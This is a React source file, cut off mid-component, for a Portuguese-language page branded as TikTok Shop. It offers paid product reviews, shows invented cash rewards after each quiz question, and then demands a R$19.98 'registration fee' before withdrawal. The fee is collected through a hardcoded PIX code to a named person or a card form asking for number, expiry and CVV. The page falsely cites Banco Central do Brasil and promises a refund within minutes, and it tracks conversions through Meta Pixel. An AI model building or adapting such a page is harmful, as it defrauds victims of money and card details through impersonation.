import React, { useState, useEffect } from 'react';
import { CheckCircle2 } from 'lucide-react';
import { QRCodeSVG } from 'qrcode.react';

// Configuração PIX - Código PIX dinâmico
const PIX_CONFIG = {
  // Código PIX completo (EMV) - use este código diretamente
  pixCode: "00020101021226900014br.gov.bcb.pix2568qrcode.globalscm.com.br/publico/cob/e78704c8c20d4f97a9b785d33f2b9b225204000053039865802BR592363364281 Virissimo Beni6008SaoPaulo62070503***6304DC98",
  // Informações do recebedor (para exibição)
  nome: "Virissimo Beni",
  cidade: "SaoPaulo",
  // Se quiser usar chave PIX estática ao invés do código dinâmico, configure abaixo:
  chave: "", // Deixe vazio se usar código dinâmico
  useDynamicPix: true // true = usa código PIX dinâmico, false = gera código estático
};

// Configuração de Webhook - UTMify/Meta
const WEBHOOK_CONFIG = {
  // URL do webhook UTMify/Meta - ALTERE AQUI
  utmifyUrl: "", // Exemplo: "https://webhook.utmify.com/your-endpoint"
  metaPixelId: "", // Exemplo: "1234567890123456" - ID do Pixel do Meta
  enabled: true // true = ativa webhooks, false = desativa
};

// Função para enviar eventos para webhook UTMify/Meta
const sendWebhookEvent = async (eventName: string, eventData: Record<string, any> = {}) => {
  if (!WEBHOOK_CONFIG.enabled) return;

  const payload = {
    event: eventName,
    timestamp: new Date().toISOString(),
    ...eventData
  };

  // Enviar para UTMify se configurado
  if (WEBHOOK_CONFIG.utmifyUrl) {
    try {
      await fetch(WEBHOOK_CONFIG.utmifyUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Erro ao enviar webhook UTMify:', error);
    }
  }

  // Enviar para Meta Pixel se configurado
  if (WEBHOOK_CONFIG.metaPixelId && typeof window !== 'undefined') {
    try {
      // Inicializa o Pixel se ainda não foi inicializado
      if (!(window as any).fbq) {
        (window as any).fbq = function() {
          (window as any).fbq.q = (window as any).fbq.q || [];
          (window as any).fbq.q.push(arguments);
        };
      }
      (window as any).fbq('init', WEBHOOK_CONFIG.metaPixelId);
      (window as any).fbq('track', eventName, eventData);
    } catch (error) {
      console.error('Erro ao enviar evento Meta Pixel:', error);
    }
  }
};

// Função para calcular CRC16 (necessário para código PIX)
const calculateCRC16 = (data: string): string => {
  const polynomial = 0x1021;
  let crc = 0xFFFF;
  
  for (let i = 0; i < data.length; i++) {
    crc ^= (data.charCodeAt(i) << 8);
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) {
        crc = (crc << 1) ^ polynomial;
      } else {
        crc <<= 1;
      }
      crc &= 0xFFFF;
    }
  }
  
  return crc.toString(16).toUpperCase().padStart(4, '0');
};

// Função para gerar código PIX (EMV) - apenas se não usar código dinâmico
const generatePixCode = (amount: number): string => {
  if (!PIX_CONFIG.chave) {
    return ""; // Retorna vazio se não houver chave configurada
  }
  
  const pixKey = PIX_CONFIG.chave;
  const merchantName = PIX_CONFIG.nome;
  const merchantCity = PIX_CONFIG.cidade;
  
  // Formata o valor (sem pontos, apenas números com 2 casas decimais)
  const amountStr = amount.toFixed(2).replace('.', '');
  
  // Identifica o tipo de chave PIX
  let keyType = "01"; // CPF
  if (pixKey.includes("@")) {
    keyType = "02"; // Email
  } else if (/^\d{10,11}$/.test(pixKey.replace(/\D/g, ''))) {
    keyType = "03"; // Telefone
  } else if (pixKey.length === 36) {
    keyType = "04"; // Chave aleatória
  }
  
  // Monta o código PIX EMV
  const payload = [
    "01", // Payload Format Indicator
    "02", // Point of Initiation Method
    "26", // Merchant Account Information
    `${keyType.length.toString().padStart(2, '0')}${keyType}${pixKey.length.toString().padStart(2, '0')}${pixKey}`, // Chave PIX
    "52", // Merchant Category Code
    "0000", // MCC padrão
    "53", // Transaction Currency
    "986", // BRL
    "54", // Transaction Amount
    `${amountStr.length.toString().padStart(2, '0')}${amountStr}`,
    "58", // Country Code
    "02BR",
    "59", // Merchant Name
    `${merchantName.length.toString().padStart(2, '0')}${merchantName}`,
    "60", // Merchant City
    `${merchantCity.length.toString().padStart(2, '0')}${merchantCity}`,
    "62", // Additional Data Field Template
    "05", // Reference Label
    "03***",
    "63" // CRC16
  ].join("");
  
  // Calcula CRC16
  const crc = calculateCRC16(payload);
  const pixCode = payload + crc;
  
  return pixCode;
};

// Types
interface QuizOption {
  id: string;
  text: string;
  emoji: string;
}

interface QuizStep {
  id: number;
  question: string;
  description?: string;
  image?: string;
  options: QuizOption[];
  reward: number;
}

// ============================================
// QUIZ DATA - ESTRUTURA DO FLUXO
// ============================================
// Steps 1-4: Perguntas iniciais (sem recompensa)
// Step 5+: Quizzes de produtos (com recompensas)
// Após step 4, o usuário vê a tela de email
// Após confirmar email, começa nos quizzes de produtos (step 5+)
// ============================================

const quizSteps: QuizStep[] = [
  // ========== PERGUNTAS INICIAIS (SEM RECOMPENSA) ==========
  {
    id: 1,
    question: "Você já ganhou algum valor trabalhando através da internet?",
    options: [
      { id: "sim", text: "Sim", emoji: "" },
      { id: "nao", text: "Não", emoji: "" },
      { id: "ganhei", text: "Já ganhei um valor bom", emoji: "" },
      { id: "nunca", text: "Nunca tentei mais tenho vontade", emoji: "" }
    ],
    reward: 0
  },
  {
    id: 2,
    question: "Você tem disponibilidade de ganhar dinheiro trabalhando poucas horas avaliando produtos?",
    options: [
      { id: "sim", text: "Sim", emoji: "" },
      { id: "nao", text: "Não", emoji: "" }
    ],
    reward: 0
  },
  {
    id: 3,
    question: "O Tiktok Shop paga você para você avaliar produtos pagamos entre R$300 a R$600 por dia, esse valor está bom para você?",
    options: [
      { id: "sim", text: "Sim", emoji: "" },
      { id: "nao", text: "Não", emoji: "" },
      { id: "otimo", text: "Está ótimo", emoji: "" }
    ],
    reward: 0
  },
  {
    id: 4,
    question: "Requisitos para começar:",
    description: "• Trabalhar de 30 a 60 minutos por dia\n• Ter Celular simples + internet\n\nTudo bem pra você podemos continuar?",
    options: [
      { id: "sim", text: "Sim, com certeza", emoji: "" },
      { id: "claro", text: "Claro, vamos para cima", emoji: "" }
    ],
    reward: 0
  },
  
  // ========== QUIZZES DE PRODUTOS (COM RECOMPENSAS) ==========
  // Após confirmar email, o lead encara vários quizzes de produtos
  // Para adicionar um novo produto, copie o template abaixo e altere:
  // - id: próximo número sequencial
  // - question: pergunta sobre o produto
  // - image: URL da imagem do produto
  // - reward: valor da recompensa (R$)
  // - options: opções de resposta (pode manter as mesmas ou personalizar)
  
  // PRODUTO 1 - EXEMPLO TEMPLATE (FACAS DE COZINHA)
  {
    id: 5,
    question: "Qual a sua opinião inicial sobre este produto?",
    image: "https://images.unsplash.com/photo-1556911220-bff31c812dba?w=400", // ALTERE: URL da imagem do produto
    options: [
      { id: "muito", text: "Muito atrativo", emoji: "🤩" },
      { id: "bonito", text: "Bonito, parece bom", emoji: "👍" },
      { id: "normal", text: "Normal, nada demais", emoji: "😐" },
      { id: "nao", text: "Não me chamou atenção", emoji: "👎" }
    ],
    reward: 74.15 // ALTERE: Valor da recompensa
  },
  // PRODUTO 2 - EXEMPLO (Pode ser replicado facilmente)
  {
    id: 6,
    question: "Você compraria esse produto para uso pessoal?",
    image: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400", // ALTERE: URL da imagem
    options: [
      { id: "sim", text: "Sim, com certeza", emoji: "" },
      { id: "talvez", text: "Talvez, dependendo do valor", emoji: "🤔" },
      { id: "nao-sei", text: "Não sei, ainda estou avaliando", emoji: "🤷" },
      { id: "nao", text: "Não, Não me interessou", emoji: "❌" }
    ],
    reward: 55.26 // ALTERE: Valor da recompensa
  },
  // PRODUTO 3
  {
    id: 7,
    question: "Como você avaliaria a aparência visual do produto?",
    image: "https://images.unsplash.com/photo-1584622650111-993a426fbf0a?w=400", // ALTERE: URL da imagem
    options: [
      { id: "muito", text: "Muito", emoji: "🔥" },
      { id: "boa", text: "Boa", emoji: "👍" },
      { id: "regular", text: "Regular", emoji: "😐" },
      { id: "fraca", text: "Fraca", emoji: "👎" }
    ],
    reward: 53.30 // ALTERE: Valor da recompensa
  },
  // PRODUTO 4
  {
    id: 8,
    question: "Esse produto parece útil no dia a dia?",
    image: "https://images.unsplash.com/photo-1572981779307-38b8cabb2407?w=400", // ALTERE: URL da imagem
    options: [
      { id: "sim", text: "Sim, muito útil", emoji: "🎯" },
      { id: "pode", text: "Pode ser útil", emoji: "👍" },
      { id: "nao-sei", text: "Não sei dizer", emoji: "👑" },
      { id: "nao", text: "Não vejo utilidade", emoji: "❌" }
    ],
    reward: 65.61 // ALTERE: Valor da recompensa
  },
  // PRODUTO 5
  {
    id: 9,
    question: "O produto parece ser de boa qualidade?",
    image: "https://images.unsplash.com/photo-1556911220-bff31c812dba?w=400", // ALTERE: URL da imagem
    options: [
      { id: "sim", text: "Sim, parece top de linha", emoji: "💅" },
      { id: "razoavel", text: "Parece razoável", emoji: "👌" },
      { id: "nao", text: "Não transmite confiança", emoji: "😬" },
      { id: "ruim", text: "Parece de qualidade ruim", emoji: "💩" }
    ],
    reward: 36.95 // ALTERE: Valor da recompensa
  },
  // PRODUTO 6
  {
    id: 10,
    question: "Você recomendaria esse produto para alguém?",
    image: "https://images.unsplash.com/photo-1585659722983-3a675dabf23d?w=400", // ALTERE: URL da imagem
    options: [
      { id: "sim", text: "Sim, sem dúvidas", emoji: "🙌" },
      { id: "talvez", text: "Talvez", emoji: "👑" },
      { id: "provavelmente", text: "Provavelmente Não", emoji: "😬" },
      { id: "nunca", text: "Nunca", emoji: "🚫" }
    ],
    reward: 38.79 // ALTERE: Valor da recompensa
  },
  // PRODUTO 7
  {
    id: 11,
    question: "A imagem do produto corresponde à expectativa real dele?",
    image: "https://images.unsplash.com/photo-1607613009820-a29f7bb81c04?w=400", // ALTERE: URL da imagem
    options: [
      { id: "sim", text: "Sim, exatamente como anunciado", emoji: "🙌" },
      { id: "quase", text: "Quase igual", emoji: "👑" },
      { id: "pouco", text: "Um pouco diferente", emoji: "😬" },
      { id: "totalmente", text: "Totalmente diferente", emoji: "❌" }
    ],
    reward: 66.66 // ALTERE: Valor da recompensa
  },
  // PRODUTO 8
  {
    id: 12,
    question: "Qual sua primeira impressão ao ver esse produto?",
    image: "https://images.unsplash.com/photo-1593642532400-2682810df593?w=400", // ALTERE: URL da imagem
    options: [
      { id: "muito", text: "Muito bom", emoji: "🤩" },
      { id: "interessante", text: "Interessante", emoji: "👀" },
      { id: "nada", text: "Nada demais", emoji: "😐" },
      { id: "negativa", text: "Negativa", emoji: "😞" }
    ],
    reward: 41.63 // ALTERE: Valor da recompensa
  },
  // PRODUTO 9
  {
    id: 13,
    question: "Esse produto parece confiável?",
    image: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=400", // ALTERE: URL da imagem
    options: [
      { id: "sim", text: "Sim, totalmente", emoji: "🔒" },
      { id: "mais", text: "Mais ou menos", emoji: "🤔" },
      { id: "pouco", text: "Pouco confiável", emoji: "⚠️" },
      { id: "nada", text: "Nada confiável", emoji: "🚫" }
    ],
    reward: 52.02 // ALTERE: Valor da recompensa
  }
  
  // ============================================
  // PARA ADICIONAR MAIS PRODUTOS:
  // 1. Copie o template do PRODUTO 1 (id: 5) acima
  // 2. Altere o id para o próximo número (14, 15, 16...)
  // 3. Altere a question conforme necessário
  // 4. Altere a image para a URL da nova imagem
  // 5. Altere o reward para o valor desejado
  // 6. Opcional: personalize as options se quiser
  // ============================================
];

// Reward Modal Component
const RewardModal = ({ 
  show, 
  amount, 
  onContinue 
}: { 
  show: boolean; 
  amount: number; 
  onContinue: () => void;
}) => {
  const [displayAmount, setDisplayAmount] = useState(0);

  useEffect(() => {
    if (show && amount > 0) {
      setDisplayAmount(0);
      const duration = 1500;
      const steps = 60;
      const increment = amount / steps;
      const stepDuration = duration / steps;

      let current = 0;
      const timer = setInterval(() => {
        current += increment;
        if (current >= amount) {
          setDisplayAmount(amount);
          clearInterval(timer);
        } else {
          setDisplayAmount(current);
        }
      }, stepDuration);

      return () => clearInterval(timer);
    }
  }, [show, amount]);

  if (!show) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-2xl p-6 max-w-sm w-full text-center shadow-xl">
        <div className="bg-green-50 rounded-lg p-3 mb-4">
          <p className="text-purple-600 font-semibold text-sm mb-2">Nova recompensa</p>
          <p className="text-gray-800 font-medium text-base mb-2">Você ganhou</p>
          <p className="text-5xl font-bold text-green-600 mb-2">
            R${displayAmount.toFixed(2).replace('.', ',')}
          </p>
          <p className="text-gray-600 text-sm">
            Responda mais pesquisas<br />para ganhar até <strong>R$850</strong>
          </p>
        </div>
        <button
          onClick={onContinue}
          className="w-full bg-black text-white py-3 rounded-full font-semibold text-base hover:bg-gray-800 transition-colors"
        >
          Continuar recebendo
        </button>
      </div>
    </div>
  );
};

// Payment Modal Component
const PaymentModal = ({
  show,
  amount,
  onPay,
  onClose
}: {
  show: boolean;
  amount: number;
  onPay: () => void;
  onClose: () => void;
}) => {
  const [paymentMethod, setPaymentMethod] = useState<string>("pix");
  const [cardNumber, setCardNumber] = useState<string>("");
  const [cardName, setCardName] = useState<string>("");
  const [cardExpiry, setCardExpiry] = useState<string>("");
  const [cardCvv, setCardCvv] = useState<string>("");
  const [pixCodeCopied, setPixCodeCopied] = useState(false);

  // Gera ou usa o código PIX quando o modal é aberto e PIX está selecionado
  const getPixCode = () => {
    if (paymentMethod !== "pix") return "";
    
    // Se usar PIX dinâmico, retorna o código configurado
    if (PIX_CONFIG.useDynamicPix && PIX_CONFIG.pixCode) {
      return PIX_CONFIG.pixCode;
    }
    
    // Caso contrário, gera código estático
    return generatePixCode(amount);
  };
  
  const pixCode = getPixCode();

  const copyPixCode = () => {
    navigator.clipboard.writeText(pixCode);
    setPixCodeCopied(true);
    setTimeout(() => setPixCodeCopied(false), 2000);
  };

  if (!show) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-2xl p-6 max-w-md w-full max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <h2 className="text-2xl font-bold text-gray-800">Pagamento</h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700"
          >
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        {/* Valor a pagar */}
        <div className="bg-gray-50 rounded-lg p-4 mb-6">
          <p className="text-sm text-gray-600 mb-1">Valor a pagar</p>
          <p className="text-3xl font-bold text-gray-800">
            R$ {amount.toFixed(2).replace('.', ',')}
          </p>
          <p className="text-xs text-gray-500 mt-1">
            Este valor será reembolsado em 1 a 5 minutos
          </p>
        </div>

        {/* Métodos de pagamento */}
        <div className="mb-6">
          <label className="block text-sm font-medium text-gray-700 mb-3">
            Selecione o método de pagamento:
          </label>
          
          <div className="space-y-2">
            {/* PIX */}
            <button
              onClick={() => setPaymentMethod("pix")}
              className={`w-full p-4 rounded-lg border-2 flex items-center justify-between transition-colors ${
                paymentMethod === "pix"
                  ? 'border-pink-500 bg-pink-50'
                  : 'border-gray-200 bg-white hover:border-gray-300'
              }`}
            >
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center">
                  <span className="text-green-600 font-bold text-lg">PIX</span>
                </div>
                <div className="text-left">
                  <p className="font-semibold text-gray-800">PIX</p>
                  <p className="text-xs text-gray-500">Aprovação instantânea</p>
                </div>
              </div>
              {paymentMethod === "pix" && (
                <div className="w-5 h-5 bg-pink-500 rounded-full flex items-center justify-center">
                  <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              )}
            </button>

            {/* Cartão de Crédito */}
            <button
              onClick={() => setPaymentMethod("card")}
              className={`w-full p-4 rounded-lg border-2 flex items-center justify-between transition-colors ${
                paymentMethod === "card"
                  ? 'border-pink-500 bg-pink-50'
                  : 'border-gray-200 bg-white hover:border-gray-300'
              }`}
            >
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center">
                  <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                  </svg>
                </div>
                <div className="text-left">
                  <p className="font-semibold text-gray-800">Cartão de Crédito</p>
                  <p className="text-xs text-gray-500">Visa, Mastercard, Elo</p>
                </div>
              </div>
              {paymentMethod === "card" && (
                <div className="w-5 h-5 bg-pink-500 rounded-full flex items-center justify-center">
                  <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              )}
            </button>
          </div>
        </div>

        {/* Formulário de pagamento PIX */}
        {paymentMethod === "pix" && (
          <div className="mb-6">
            <div className="bg-green-50 border-2 border-green-200 rounded-lg p-6 text-center">
              <p className="text-sm font-semibold text-gray-800 mb-4">
                Escaneie o QR Code com seu app de pagamento
              </p>
              
              {/* QR Code */}
              <div className="bg-white p-4 rounded-lg mb-4 flex justify-center">
                <QRCodeSVG 
                  value={pixCode} 
                  size={200}
                  level="H"
                  includeMargin={true}
                />
              </div>

              {/* Código PIX copiável */}
              <div className="mb-4">
                <label className="block text-sm font-medium text-gray-700 mb-2 text-left">
                  Ou copie o código PIX:
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={pixCode}
                    readOnly
                    className="flex-1 px-4 py-3 border border-gray-300 rounded-lg bg-white text-xs font-mono"
                  />
                  <button
                    onClick={copyPixCode}
                    className={`px-4 py-3 rounded-lg font-semibold transition-colors ${
                      pixCodeCopied
                        ? 'bg-green-500 text-white'
                        : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                    }`}
                  >
                    {pixCodeCopied ? '✓ Copiado' : 'Copiar'}
                  </button>
                </div>
              </div>

              {/* Informações do pagamento */}
              <div className="bg-white rounded-lg p-3 text-left space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-600">Valor:</span>
                  <span className="font-semibold text-gray-800">R$ {amount.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-600">Cidade:</span>
                  <span className="font-semibold text-gray-800 text-xs">{PIX_CONFIG.cidade}</span>
                </div>
              </div>

              <p className="text-xs text-gray-500 mt-4">
                Após o pagamento, aguarde a confirmação automática
              </p>
            </div>
          </div>
        )}

        {paymentMethod === "card" && (
          <div className="mb-6 space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Número do cartão
              </label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
                placeholder="0000 0000 0000 0000"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Nome no cartão
              </label>
              <input
                type="text"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                placeholder="Nome completo"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Validade
                </label>
                <input
                  type="text"
                  value={cardExpiry}
                  onChange={(e) => {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 2) {
                      value = value.slice(0, 2) + '/' + value.slice(2, 4);
                    }
                    setCardExpiry(value.slice(0, 5));
                  }}
                  placeholder="MM/AA"
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  CVV
                </label>
                <input
                  type="text"
                  value={cardCvv}
                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  placeholder="123"
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500"
                />
              </div>
            </div>
          </div>
        )}

        {/* Botão de pagamento */}
        {paymentMethod === "pix" ? (
          <div className="space-y-3">
            <button
              onClick={onPay}
              className="w-full bg-pink-500 text-white py-4 rounded-lg font-bold text-lg hover:bg-pink-600 transition-colors"
            >
              JÁ PAGUEI, CONFIRMAR PAGAMENTO
            </button>
            <p className="text-xs text-center text-gray-500">
              Clique apenas após realizar o pagamento via PIX
            </p>
          </div>
        ) : (
          <button
            onClick={onPay}
            className="w-full bg-pink-500 text-white py-4 rounded-lg font-bold text-lg hover:bg-pink-600 transition-colors mb-3"
          >
            PAGAR R$ {amount.toFixed(2).replace('.', ',')}
          </button>
        )}

        {/* Segurança */}
        <div className="flex items-center justify-center gap-2 text-xs text-gray-500">
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
          <span>Pagamento 100% seguro</span>
        </div>
      </div>
    </div>
  );
};

// Final Modal Component
const FinalModal = ({ 
  show, 
  totalAmount, 
  onWithdraw 
}: { 
  show: boolean; 
  totalAmount: number; 
  onWithdraw: () => void;
}) => {
  if (!show) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-2xl p-6 max-w-sm w-full text-center shadow-xl">
        <div className="bg-purple-600 text-white rounded-lg p-6 mb-4">
          <p className="text-yellow-300 font-semibold text-sm mb-2">Nova recompensa</p>
          <p className="font-medium text-base mb-2">Você ganhou</p>
          <p className="text-6xl font-bold text-yellow-300 mb-3">
            R${totalAmount.toFixed(2).replace('.', ',')}
          </p>
          <p className="text-sm">
            Clique no botão abaixo para<br />sacar suas recompensas
          </p>
        </div>
        <button
          onClick={onWithdraw}
          className="w-full bg-white border-2 border-purple-600 text-purple-600 py-3 rounded-full font-semibold text-base hover:bg-purple-50 transition-colors"
        >
          Sacar meu dinheiro
        </button>
      </div>
    </div>
  );
};

// Balance Unlock Screen Component
const BalanceUnlockScreen = ({
  totalEarned,
  onUnlock,
  onBack
}: {
  totalEarned: number;
  onUnlock: () => void;
  onBack: () => void;
}) => {
  const [videoWatched, setVideoWatched] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState(10);

  useEffect(() => {
    // Timer de 10 segundos
    const timer = setInterval(() => {
      setTimeRemaining((prev) => {
        if (prev <= 1) {
          setVideoWatched(true);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Banner vermelho no topo */}
      <div className="bg-red-600 text-white text-center py-2 px-4 text-sm font-semibold">
        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
      </div>

      {/* Header */}
      <div className="bg-white shadow-sm p-4 flex items-center justify-between">
        <img 
          src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" 
          alt="TikTok" 
          className="h-6"
        />
        <button className="bg-white border-2 border-pink-200 px-4 py-2 rounded-lg">
          <div className="text-xs text-gray-600">SALDO</div>
          <div className="text-sm font-bold text-gray-800">R$ {totalEarned.toFixed(2).replace('.', ',')}</div>
        </button>
      </div>

      {/* Conteúdo principal */}
      <div className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md">
          {/* Título */}
          <div className="text-center mb-6">
            <h1 className="text-3xl font-bold text-pink-500 mb-2">DESBLOQUEIO DE SALDO</h1>
            <p className="text-gray-600 text-sm">
              Veja como liberar seu saque assistindo ao vídeo.
            </p>
          </div>

          {/* Player de vídeo */}
          <div className="mb-6 border-2 border-red-500 rounded-lg overflow-hidden bg-black">
            <video
              className="w-full"
              controls
              autoPlay
              muted
            >
              <source src="/vsl/vsl.mp4" type="video/mp4" />
              Seu navegador não suporta o elemento de vídeo.
            </video>
          </div>

          {/* Botão de desbloqueio */}
          <button
            onClick={onUnlock}
            disabled={!videoWatched}
            className={`w-full py-4 rounded-lg font-bold text-lg transition-colors ${
              videoWatched
                ? 'bg-pink-500 text-white hover:bg-pink-600 shadow-lg'
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            }`}
          >
            {videoWatched ? 'DESBLOQUEAR AGORA' : `Aguarde ${timeRemaining}s...`}
          </button>

          {!videoWatched && (
            <p className="text-center text-sm text-gray-500 mt-2">
              Aguarde {timeRemaining} segundo{timeRemaining !== 1 ? 's' : ''} para desbloquear
            </p>
          )}

          {/* Botão voltar */}
          <button
            onClick={onBack}
            className="w-full mt-4 text-gray-500 text-sm hover:text-gray-700 transition-colors"
          >
            Voltar
          </button>
        </div>
      </div>
    </div>
  );
};

// Registration Fee Screen Component
const RegistrationFeeScreen = ({
  onPay,
  onBack
}: {
  onPay: () => void;
  onBack: () => void;
}) => {
  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl max-w-md w-full p-6">
        {/* Header com logo TikTok */}
        <div className="flex items-center justify-center mb-6">
          <img 
            src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" 
            alt="TikTok" 
            className="h-8"
          />
        </div>

        {/* Título com ícone */}
        <div className="flex items-center gap-3 mb-4">
          <div className="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
            <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800">Taxa de Cadastro</h1>
        </div>

        {/* Descrição */}
        <div className="mb-6 space-y-3">
          <p className="text-gray-700 text-sm leading-relaxed">
            Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de <strong className="text-gray-900">R$ 19,98</strong> para garantir a autenticidade dos participantes.
          </p>
          <p className="text-gray-700 text-sm leading-relaxed">
            O dinheiro será totalmente reembolsado entre <strong className="text-gray-900">1 a 5 minutos</strong> junto ao saldo acumulado.
          </p>
        </div>

        {/* Cards informativos */}
        <div className="space-y-3 mb-6">
          {/* Card 1 - Taxa obrigatória */}
          <div className="bg-white border-2 border-gray-200 rounded-xl p-4 flex items-start gap-3">
            <div className="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center flex-shrink-0">
              <svg className="w-6 h-6 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <div>
              <h3 className="font-semibold text-gray-800 mb-1">Taxa obrigatória</h3>
              <p className="text-sm text-gray-600">Obrigatório para realizar o saque dos seus ganhos.</p>
            </div>
          </div>

          {/* Card 2 - Valor reembolsável */}
          <div className="bg-white border-2 border-gray-200 rounded-xl p-4 flex items-start gap-3">
            <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center flex-shrink-0">
              <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
            </div>
            <div>
              <h3 className="font-semibold text-gray-800 mb-1">Valor reembolsável</h3>
              <p className="text-sm text-gray-600">Você recebe os R$ 19,98 de volta após finalizar.</p>
            </div>
          </div>

          {/* Card 3 - Garantia de segurança */}
          <div className="bg-white border-2 border-gray-200 rounded-xl p-4 flex items-start gap-3">
            <div className="w-10 h-10 bg-orange-100 rounded-lg flex items-center justify-center flex-shrink-0">
              <svg className="w-6 h-6 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <div>
              <h3 className="font-semibold text-gray-800 mb-1">Garantia de segurança</h3>
              <p className="text-sm text-gray-600">Seu pagamento é seguro e protegido por Banco Central do Brasil.</p>
            </div>
          </div>
        </div>

        {/* Botão de ação */}
        <button
          onClick={onPay}
          className="w-full bg-pink-500 text-white py-4 rounded-lg font-bold text-lg hover:bg-pink-600 transition-colors shadow-lg"
        >
          REALIZAR SAQUE
        </button>

        {/* Botão de voltar (opcional, discreto) */}
        <button
          onClick={onBack}
          className="w-full mt-3 text-gray-500 text-sm hover:text-gray-700 transition-colors"
        >
          Voltar
        </button>
      </div>
    </div>
  );
};

// Withdraw Screen Component
const WithdrawScreen = ({
  totalEarned,
  lastReward,
  onBack,
  onWithdraw
}: {
  totalEarned: number;
  lastReward: number;
